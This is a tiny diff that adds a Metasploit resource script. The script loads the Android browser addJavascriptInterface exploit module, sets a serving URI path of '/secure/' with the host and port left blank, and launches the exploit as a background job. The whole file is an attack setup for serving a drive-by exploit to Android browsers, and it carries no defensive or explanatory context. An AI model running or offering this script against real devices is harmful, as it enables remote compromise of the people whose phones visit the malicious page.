@@ -1,0 +1,6 @@
+use exploit/android/browser/add_javascriptinterface
+set srvhost 
+set srvport
+set uripath /secure/
+exploit -j
+
